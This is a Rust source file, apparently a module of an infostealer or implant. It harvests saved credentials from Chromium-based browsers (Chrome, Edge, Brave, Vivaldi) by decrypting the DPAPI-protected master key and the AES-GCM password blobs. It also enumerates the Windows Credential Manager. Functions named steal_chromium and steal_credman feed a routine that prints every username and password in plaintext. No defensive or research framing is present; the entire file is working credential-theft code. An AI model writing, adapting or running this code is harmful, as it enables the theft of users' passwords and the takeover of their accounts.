/// Browser credential harvesting: Chromium browsers + Windows Credential Manager.

use std::path::PathBuf;
use std::fs;
use base64::{engine::general_purpose::STANDARD, Engine as _};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use aes_gcm::aead::{Aead, KeyInit};
use rusqlite::{Connection, OpenFlags};

// ── DPAPI ─────────────────────────────────────────────────────────────────────
#[repr(C)]
struct DataBlob { cb: u32, pb: *mut u8 }

#[link(name = "crypt32")]
extern "system" {
    fn CryptUnprotectData(
        data_in:  *const DataBlob, desc: *mut *mut u16, entropy: *const DataBlob,
        reserved: *mut u8,        prompt: *mut u8,     flags: u32,
        data_out: *mut DataBlob,
    ) -> i32;
}
#[link(name = "kernel32")]
extern "system" {
    fn LocalFree(mem: *mut u8) -> *mut u8;
}

fn dp_unprotect(data: &[u8]) -> Option<Vec<u8>> {
    if data.is_empty() { return None; }
    let in_b  = DataBlob { cb: data.len() as u32, pb: data.as_ptr() as *mut u8 };
    let mut out_b = DataBlob { cb: 0, pb: std::ptr::null_mut() };
    let ok = unsafe { CryptUnprotectData(&in_b, std::ptr::null_mut(), std::ptr::null(),
        std::ptr::null_mut(), std::ptr::null_mut(), 0, &mut out_b) };
    if ok == 0 || out_b.pb.is_null() { return None; }
    let v = unsafe { std::slice::from_raw_parts(out_b.pb, out_b.cb as usize).to_vec() };
    unsafe { LocalFree(out_b.pb) };
    Some(v)
}

// ── AES-256-GCM ───────────────────────────────────────────────────────────────
fn decrypt_gcm(aes_key: &[u8], enc: &[u8]) -> Option<String> {
    if enc.len() < 3 || aes_key.len() < 32 { return None; }
    if !enc.starts_with(b"v10") && !enc.starts_with(b"v11") { return None; }
    let payload = &enc[3..];
    if payload.len() < 12 { return None; }
    let nonce = Nonce::from_slice(&payload[..12]);
    let key   = Key::<Aes256Gcm>::from_slice(&aes_key[..32]);
    let plain = Aes256Gcm::new(key).decrypt(nonce, &payload[12..]).ok()?;
    String::from_utf8(plain).ok()
}

fn decrypt_pw(enc: &[u8], aes_key: &[u8]) -> String {
    if enc.is_empty() { return String::new(); }
    if enc.len() > 3 && (enc.starts_with(b"v10") || enc.starts_with(b"v11")) {
        return decrypt_gcm(aes_key, enc).unwrap_or_default();
    }
    dp_unprotect(enc).and_then(|b| String::from_utf8(b).ok()).unwrap_or_default()
}

// ── Chromium master key ───────────────────────────────────────────────────────
fn chromium_master_key(base: &PathBuf) -> Vec<u8> {
    let raw = fs::read_to_string(base.join("Local State")).unwrap_or_default();
    let m = "\"encrypted_key\":\"";
    if let Some(s) = raw.find(m) {
        let rest = &raw[s + m.len()..];
        if let Some(e) = rest.find('"') {
            if let Ok(dec) = STANDARD.decode(&rest[..e]) {
                if dec.len() > 5 && dec.starts_with(b"DPAPI") {
                    return dp_unprotect(&dec[5..]).unwrap_or_default();
                }
            }
        }
    }
    Vec::new()
}

// ── Read Chromium login DB ────────────────────────────────────────────────────
pub struct BrowserCred { pub source: String, pub target: String, pub username: String, pub password: String }

fn read_logins(db: &PathBuf, key: &[u8], browser: &str) -> Vec<BrowserCred> {
    let tmp = std::env::temp_dir().join(format!("ld_{}.db", std::process::id()));
    if fs::copy(db, &tmp).is_err() { return Vec::new(); }
    let creds = read_logins_inner(&tmp, key, browser);
    let _ = fs::remove_file(&tmp);
    creds
}

fn read_logins_inner(path: &PathBuf, key: &[u8], browser: &str) -> Vec<BrowserCred> {
    let conn = match Connection::open_with_flags(path, OpenFlags::SQLITE_OPEN_READ_ONLY) {
        Ok(c) => c, Err(_) => return Vec::new(),
    };
    let mut stmt = match conn.prepare(
        "SELECT origin_url,username_value,password_value FROM logins WHERE username_value!=''"
    ) { Ok(s) => s, Err(_) => return Vec::new() };
    let mut out = Vec::new();
    if let Ok(rows) = stmt.query_map([], |r| Ok((
        r.get::<_, String>(0)?, r.get::<_, String>(1)?, r.get::<_, Vec<u8>>(2)?
    ))) {
        for (url, user, enc) in rows.flatten() {
            let pw = decrypt_pw(&enc, key);
            if !pw.is_empty() {
                out.push(BrowserCred { source: browser.into(), target: url, username: user, password: pw });
            }
        }
    }
    out
}

fn profiles(base: &PathBuf) -> Vec<String> {
    let mut p = vec!["Default".to_string()];
    if let Ok(e) = fs::read_dir(base) {
        for n in e.flatten().filter_map(|e| {
            let n = e.file_name().to_string_lossy().to_string();
            if e.file_type().map(|t| t.is_dir()).unwrap_or(false) && n.starts_with("Profile ") { Some(n) } else { None }
        }) { p.push(n); }
    }
    p
}

const BROWSERS: &[(&str, &str)] = &[
    ("Chrome",  r"Google\Chrome\User Data"),
    ("Edge",    r"Microsoft\Edge\User Data"),
    ("Brave",   r"BraveSoftware\Brave-Browser\User Data"),
    ("Vivaldi", r"Vivaldi\User Data"),
];

fn steal_chromium() -> Vec<BrowserCred> {
    let mut creds = Vec::new();
    let la = std::env::var("LOCALAPPDATA")
        .or_else(|_| std::env::var("USERPROFILE").map(|u| format!(r"{}\AppData\Local", u)))
        .unwrap_or_default();
    if la.is_empty() { return creds; }
    for (name, rel) in BROWSERS {
        let base = PathBuf::from(&la).join(rel);
        if !base.is_dir() { continue; }
        let mk = chromium_master_key(&base);
        for prof in profiles(&base) {
            let db = base.join(&prof).join("Login Data");
            if db.is_file() { creds.extend(read_logins(&db, &mk, name)); }
        }
    }
    creds
}

// ── Windows Credential Manager ────────────────────────────────────────────────
#[repr(C)]
struct CredW {
    flags: u32, typ: u32, target: *mut u16, comment: *mut u16,
    last: [u32; 2], blob_size: u32, blob: *mut u8, persist: u32,
    attr_count: u32, attrs: *mut u8, alias: *mut u16, user: *mut u16,
}

#[link(name = "advapi32")]
extern "system" {
    fn CredEnumerateW(filter: *const u16, flags: u32, count: *mut u32, creds: *mut *mut *mut CredW) -> i32;
    fn CredFree(buf: *mut u8);
}

fn wstr(p: *mut u16) -> String {
    if p.is_null() { return String::new(); }
    unsafe {
        let mut n = 0; while *p.add(n) != 0 { n += 1; }
        String::from_utf16_lossy(std::slice::from_raw_parts(p, n))
    }
}

fn steal_credman() -> Vec<BrowserCred> {
    let mut out = Vec::new();
    let mut count = 0u32;
    let mut pp: *mut *mut CredW = std::ptr::null_mut();
    if unsafe { CredEnumerateW(std::ptr::null(), 0, &mut count, &mut pp) } == 0 { return out; }
    unsafe {
        for &p in std::slice::from_raw_parts(pp, count as usize) {
            if p.is_null() || (*p).user.is_null() { continue; }
            let target = wstr((*p).target);
            let user   = wstr((*p).user);
            let mut pw = String::new();
            let bsz = (*p).blob_size as usize;
            if bsz > 0 && !(*p).blob.is_null() {
                if bsz % 2 == 0 {
                    let s = String::from_utf16_lossy(std::slice::from_raw_parts((*p).blob as *const u16, bsz/2));
                    if s.chars().all(|c| !c.is_control()) { pw = s; }
                }
                if pw.is_empty() {
                    pw = String::from_utf8_lossy(std::slice::from_raw_parts((*p).blob, bsz)).to_string();
                }
            }
            out.push(BrowserCred { source: "CredManager".into(), target, username: user, password: pw });
        }
        CredFree(pp as _);
    }
    out
}

// ── Public entry point ────────────────────────────────────────────────────────
pub fn do_browser_creds() -> String {
    let mut all = steal_chromium();
    all.extend(steal_credman());
    if all.is_empty() { return "no credentials found".to_string(); }
    let mut sb = String::new();
    for c in &all {
        sb.push_str(&format!("[{}] {}\n  user: {}\n  pass: {}\n\n",
            c.source, c.target, c.username, c.password));
    }
    sb
}
